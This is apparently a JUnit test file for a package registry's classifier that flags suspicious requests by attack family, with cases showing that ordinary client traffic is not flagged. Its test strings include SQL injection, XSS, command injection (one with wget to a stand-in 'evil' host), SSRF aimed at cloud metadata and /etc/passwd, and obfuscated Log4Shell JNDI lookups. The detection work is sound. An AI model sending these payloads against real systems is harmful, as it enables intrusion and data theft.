/*
 * Copyright 2026 the original author or authors.
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      https://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
package io.repsy.protocols.shared.auth;

import static org.assertj.core.api.Assertions.assertThat;

import java.util.Map;
import java.util.Set;
import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.CsvSource;
import org.junit.jupiter.params.provider.ValueSource;

/** The families of RPS-2321, each with what a scanner sends and what Repsy's own clients send. */
@DisplayName("SuspiciousRequestClassifier families (RPS-2321)")
class SuspiciousRequestFamiliesTest {

  private final SuspiciousRequestClassifier classifier =
      new SuspiciousRequestClassifier(
          SuspiciousRequestProperties.of(AuthThrottleMode.ENFORCE, 10, 3600));

  private Set<SignalFamily> api(final String uri) {

    return this.classifier.classify("GET", uri, true);
  }

  private Set<SignalFamily> protocol(final String uri) {

    return this.classifier.classify("GET", uri, false);
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/wp-login.php",
        "/index.php?id=1",
        "/xmlrpc.php",
        "/admin/login.asp",
        "/default.aspx",
        "/manager/html/x.jsp",
        "/cgi-bin/test.cgi",
        "/phpmyadmin/index.html",
        "/wp-admin/setup-config.php",
        "/shell.php;.jpg",
        "/%70hp.php",
      })
  @DisplayName("a request for a script Repsy does not have is a SCRIPT_TARGET on the API port")
  void scriptTargetIsRecognised(final String uri) {

    assertThat(this.api(uri)).contains(SignalFamily.SCRIPT_TARGET);
    assertThat(this.protocol(uri)).doesNotContain(SignalFamily.SCRIPT_TARGET);
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/api/repos/acme/shop.php",
        "/api/repos/acme/content/index.php",
        "/api/mvn/artifacts/repo/com/example/lib/1.0/wp-content/x.jsp",
      })
  @DisplayName("a stored name under /api/ is not a script probe, the panel requests it itself")
  void storedNamesUnderApiAreNoSignal(final String uri) {

    assertThat(this.api(uri)).doesNotContain(SignalFamily.SCRIPT_TARGET);
  }

  @Test
  @DisplayName("a browser navigating to a repo named like a script is not a probe")
  void navigationToAScriptNameIsNoSignal() {

    assertThat(this.classifier.classify("GET", "/acme/shop.php", "Mozilla/5.0", true, true))
        .doesNotContain(SignalFamily.SCRIPT_TARGET);
    assertThat(this.classifier.classify("GET", "/acme/shop.php", "curl/8.5.0", false, true))
        .contains(SignalFamily.SCRIPT_TARGET);
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/api/repos?q=1 union select password from users",
        "/api/repos?q=1+UNION+SELECT+password",
        "/api/repos?q=1%27%20or%201%3D1",
        "/api/repos?id=1;select+pg_sleep(5)",
        "/api/repos?q=sleep(10)",
        "/api/repos?q=x%27%20or%20%27a%27%3D%27a",
        "/api/repos?q=select+*+from+information_schema.tables",
        "/api/x/union%20select/y",
      })
  @DisplayName("a multi-word or function SQL injection is a SQLI")
  void sqlInjectionIsRecognised(final String uri) {

    assertThat(this.api(uri)).contains(SignalFamily.SQLI);
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/api/repos?q=select",
        "/api/repos?q=union",
        "/api/repos?q=drop+table",
        "/api/npm/packages/repo?q=sleep",
        "/api/repos?q=order+by+name&sort=name,asc",
        "/api/repos/my-select-repo/settings",
        "/api/docker/images/repo?q=sql",
      })
  @DisplayName("a lone SQL keyword is never a signal")
  void loneSqlKeywordIsNoSignal(final String uri) {

    assertThat(this.api(uri)).doesNotContain(SignalFamily.SQLI);
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/api/repos?q=<script>alert(1)</script>",
        "/api/repos?q=%3Cscript%3Ealert(1)",
        "/api/repos?q=javascript:alert(1)",
        "/api/repos?q=%22%20onerror=alert(1)",
        "/api/repos?q=<svg/onload=alert(1)>",
      })
  @DisplayName("markup or a script URL is an XSS")
  void xssIsRecognised(final String uri) {

    assertThat(this.api(uri)).contains(SignalFamily.XSS);
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/api/repos?q=$(id)",
        "/api/repos?q=%60id%60",
        "/api/repos?cmd=/bin/sh",
        "/api/repos?x=1;wget http://evil/x",
        "/api/repos?x=cmd.exe",
      })
  @DisplayName("a shell command in the query is a CMDI")
  void commandInjectionIsRecognised(final String uri) {

    assertThat(this.api(uri)).contains(SignalFamily.CMDI);
  }

  @Test
  @DisplayName("Maven's ${project.version} in a path is no command injection")
  void mavenPlaceholderInThePathIsNoSignal() {

    assertThat(this.api("/api/mvn/artifacts/repo/com/example/${project.version}/x.pom")).isEmpty();
    assertThat(this.protocol("/repo/com/example/lib/${project.version}/lib.pom")).isEmpty();
    assertThat(this.api("/api/x/$(id)")).doesNotContain(SignalFamily.CMDI);
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/api/x?url=http://169.254.169.254/latest/meta-data/",
        "/api/x?u=http://metadata.google.internal/computeMetadata/v1/",
        "/api/x?file=file:///etc/passwd",
        "/api/x?u=gopher://127.0.0.1:6379/_",
        "/api/x?u=dict://localhost:11211/stat",
      })
  @DisplayName("a query value aimed at cloud metadata or a file URL is an SSRF_URL")
  void ssrfIsRecognised(final String uri) {

    assertThat(this.api(uri)).contains(SignalFamily.SSRF_URL);
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/api/auth/oauth/callback?code=abc&redirect_uri=http://localhost:4200/cb",
        "/api/x?url=https://example.com/repo",
        "/api/x/169.254.169.254",
      })
  @DisplayName("a localhost redirect or a metadata address in a path is no SSRF_URL")
  void ordinaryUrlsAreNoSsrf(final String uri) {

    assertThat(this.api(uri)).doesNotContain(SignalFamily.SSRF_URL);
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/${jndi:ldap://evil/a}",
        "/api/x?q=${jndi:rmi://evil/a}",
        "/api/x?q=%24%7Bjndi:ldap://evil/a%7D",
        "/api/x?q=${${::-j}ndi:ldap://evil/a}",
        "/api/x?q=${lower:j}ndi",
      })
  @DisplayName("a JNDI lookup is a LOG4SHELL, on both ports")
  void log4ShellIsRecognised(final String uri) {

    assertThat(this.api(uri)).contains(SignalFamily.LOG4SHELL);
    assertThat(this.protocol(uri)).contains(SignalFamily.LOG4SHELL);
  }

  @ParameterizedTest
  @ValueSource(strings = {"/api/x?q={{7*7}}", "/api/x?q=${7*7}", "/api/x?q=%7b%7b7*7%7d%7d"})
  @DisplayName("a template expression is an SSTI")
  void sstiIsRecognised(final String uri) {

    assertThat(this.api(uri)).contains(SignalFamily.SSTI);
  }

  @ParameterizedTest
  @ValueSource(strings = {"/api/x/%252e%252e/y", "/api/x?q=%2525", "/api/x/%252f"})
  @DisplayName("a percent sign encoded again is DOUBLE_ENCODED")
  void doubleEncodingIsRecognised(final String uri) {

    assertThat(this.api(uri)).contains(SignalFamily.DOUBLE_ENCODED);
  }

  @ParameterizedTest
  @ValueSource(
      strings = {
        "/api/repos?q=100%25",
        "/repo/@scope%2fpkg",
        "/api/repos?q=a%20b",
        "/v2/repo/blobs/sha256%3Aabcdef",
      })
  @DisplayName("an ordinary escape, or a lone encoded percent, is not DOUBLE_ENCODED")
  void ordinaryEscapesAreNoSignal(final String uri) {

    assertThat(this.api(uri)).doesNotContain(SignalFamily.DOUBLE_ENCODED);
  }

  @Test
  @DisplayName("a URI over 2048 characters is OVERLONG_URI, the cap on what is read stays 4096")
  void overlongUriIsRecognised() {

    final var longUri = "/api/repos?q=" + "a".repeat(2100);
    final var hugeUri = "/api/repos?q=" + "a".repeat(100_000);

    assertThat(this.api(longUri)).contains(SignalFamily.OVERLONG_URI);
    assertThat(this.api(hugeUri)).contains(SignalFamily.OVERLONG_URI);
    assertThat(this.api("/api/repos?q=" + "a".repeat(1000))).isEmpty();
    assertThat(this.protocol(longUri)).doesNotContain(SignalFamily.OVERLONG_URI);
  }

  @ParameterizedTest
  @CsvSource({
    "sqlmap/1.7.2#stable (https://sqlmap.org), true",
    "Mozilla/5.00 (Nikto/2.1.6), true",
    "Nuclei - Open-source project (github.com/projectdiscovery/nuclei), true",
    "Mozilla/5.0 zgrab/0.x, true",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36, false",
    "Apache-Maven/3.9.6 (Java 21.0.2; Linux 6.5), false",
    "npm/10.2.4 node/v20.11.0 linux x64 workspaces/false, false",
    "docker/25.0.3 go/go1.21.6 git-commit/f417435 os/linux arch/amd64, false",
    "pip/24.0 {\"installer\":{\"name\":\"pip\"}}, false",
    "NuGet Command Line/6.8.0, false",
    "cargo 1.76.0 (c84b36747 2024-01-18), false",
    "helm/3.14.0, false",
    "Go-http-client/1.1, false",
    "python-requests/2.31.0, false",
    "curl/8.5.0, false",
  })
  @DisplayName("a scanner's User-Agent is SCANNER_UA, a package manager's is not")
  void scannerAgentIsRecognised(final String userAgent, final boolean scanner) {

    final var found = this.classifier.classify("GET", "/anything", userAgent, false, false);

    assertThat(found.contains(SignalFamily.SCANNER_UA)).isEqualTo(scanner);
  }

  @Test
  @DisplayName("a family can be widened to the protocol port or switched off in the settings")
  void familyScopeFollowsTheSettings() {

    final var widened =
        new SuspiciousRequestClassifier(
            new SuspiciousRequestProperties(
                AuthThrottleMode.ENFORCE,
                10,
                60L,
                3600L,
                100L,
                java.util.List.of(),
                Map.of(
                    "script-target",
                    new SuspiciousRequestProperties.Signal(null, null, false),
                    "sqli",
                    new SuspiciousRequestProperties.Signal(false, null, null))));

    assertThat(widened.classify("GET", "/x.php", false)).contains(SignalFamily.SCRIPT_TARGET);
    assertThat(widened.classify("GET", "/api/x?q=sleep(5)", true))
        .doesNotContain(SignalFamily.SQLI);
  }
}
